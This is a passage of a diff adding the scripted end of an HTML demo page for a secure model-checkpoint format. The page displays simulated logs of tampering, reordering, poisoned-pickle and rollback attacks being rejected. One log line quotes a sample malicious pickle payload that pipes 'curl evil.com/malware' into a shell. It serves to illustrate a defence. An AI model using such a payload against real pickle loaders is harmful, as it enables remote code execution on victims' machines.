+          "[RECEIVED AAD] artifact_id='run_01' || chunk_index=1 || total_chunks=2",
+          "[FAIL CLOSED] Out-of-order chunk injection detected. Halting pipeline.",
+          "CheckpointError: Chunk envelope AAD validation mismatch at offset 0x4800."
+        ]
+      },
+      pickle_exploit: {
+        title: "SCENARIO 4: POISONED PICKLE RCE ATTEMPT",
+        badge: "PARSER REJECTED (ZERO-PICKLE)",
+        badgeClass: "bg-purple-500/20 text-purple-400 border border-purple-500/30",
+        logs: [
+          "[ADVERSARY] Injected malicious pickle bytecode: `cos\\nsystem\\n(S'curl evil.com/malware | sh')`...",
+          "[INFO] Submitting file to TorchVault loader...",
+          "[PARSER] Checking container format...",
+          "[INSPECTION] File does not use pickle / `torch.load(..., weights_only=False)`.",
+          "[PARSER] Parser reads strictly fixed-width binary IEEE 754 float buffers and JSON manifests.",
+          "[SECURITY NOTICE] Executable bytecode ignored completely; no Python opcode evaluation occurs.",
+          "[RESULT] Exploit rendered 100% inert. Zero code execution risk."
+        ]
+      },
+      rollback: {
+        title: "SCENARIO 5: REPLAY / ROLLBACK ATTACK",
+        badge: "FRESHNESS REJECTED",
+        badgeClass: "bg-red-500/20 text-red-400 border border-red-500/30",
+        logs: [
+          "[INFO] Attempting to load superseded checkpoint 'model_step100.ahcc'...",
+          "[FRESHNESS] Querying SQLite Freshness Ledger at 'ledger.db'...",
+          "[FRESHNESS] Monotonic High-Water Mark for pipeline 'run_01': Global Step 500",
+          "[SECURITY ALERT] Target checkpoint declares Global Step 100!",
+          "[SECURITY ALERT] Checkpoint step 100 is older than recorded high-water mark 500.",
+          "[FAIL CLOSED] Rejecting rollback attempt to protect model integrity.",
+          "RollbackError: Checkpoint step 100 superseded by established generation 500."
+        ]
+      }
+    };
+
+    function runScenario(type) {
+      // Update buttons
+      ['clean', 'tamper_weight', 'reorder', 'pickle_exploit', 'rollback'].forEach(key => {
+        const btn = document.getElementById('btn-' + key);
+        if (key === type) {
+          btn.className = "w-full text-left p-3.5 rounded-xl border border-purple-500/50 bg-purple-500/10 text-white font-medium text-sm transition flex items-center justify-between";
+        } else {
+          btn.className = "w-full text-left p-3.5 rounded-xl border border-slate-800 bg-slate-950/60 hover:bg-slate-800/60 text-slate-300 font-medium text-sm transition flex items-center justify-between";
+        }
+      });
+
+      const sc = scenarios[type];
+      document.getElementById('terminal-title').textContent = sc.title;
+
+      const logsContainer = document.getElementById('terminal-logs');
+      logsContainer.innerHTML = '';
+
+      sc.logs.forEach((log, index) => {
+        const line = document.createElement('div');
+        line.className = "flex items-start gap-2 text-slate-300";
+        if (log.includes("[SECURITY ALERT]") || log.includes("AuthenticationError") || log.includes("RollbackError")) {
+          line.className = "flex items-start gap-2 text-red-400 font-bold";
+        } else if (log.includes("[SUCCESS]") || log.includes("[VALID]") || log.includes("[OK]")) {
+          line.className = "flex items-start gap-2 text-emerald-400";
+        } else if (log.includes("[ADVERSARY]")) {
+          line.className = "flex items-start gap-2 text-amber-300";
+        }
+        line.innerHTML = `<span class="text-slate-600 select-none">&gt;</span> <span>${log}</span>`;
+        logsContainer.appendChild(line);
+      });
+
+      const statusBar = document.getElementById('status-bar');
+      statusBar.innerHTML = `
+        <div class="flex items-center gap-2">
+          <span class="text-xs text-slate-400">Status Result:</span>
+          <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold ${sc.badgeClass}">${sc.badge}</span>
+        </div>
+        <span class="text-xs font-mono text-slate-500">Latency: 1.42 ms</span>
+      `;
+    }
+
+    function selectSection(name) {
+      ['header', 'chunks', 'manifest'].forEach(sec => {
+        const el = document.getElementById('sec-' + sec);
+        if (sec === name) {
+          el.className = "cursor-pointer p-4 rounded-xl border border-purple-500/50 bg-purple-500/10 transition";
+        } else {
+          el.className = "cursor-pointer p-4 rounded-xl border border-slate-800 bg-slate-900 hover:border-slate-700 transition";
+        }
+      });
+    }
+
+    function switchTab(tab) {
+      ['pytorch', 'hf', 'cli'].forEach(t => {
+        document.getElementById('tab-' + t).classList.add('hidden');
+        const btn = document.getElementById('tab-btn-' + t);
+        btn.className = "px-5 py-2 rounded-lg text-xs font-bold text-slate-400 hover:text-white transition";
+      });
+
+      document.getElementById('tab-' + tab).classList.remove('hidden');
+      const activeBtn = document.getElementById('tab-btn-' + tab);
+      activeBtn.className = "px-5 py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition";
+    }
+
+    function copyCode(id) {
+      const text = document.getElementById(id).innerText;
+      navigator.clipboard.writeText(text);
+      alert("Code copied to clipboard!");
+    }
+
+    // Initialize clean scenario on load
+    runScenario('clean');
+  </script>
+
+</body>
+</html>
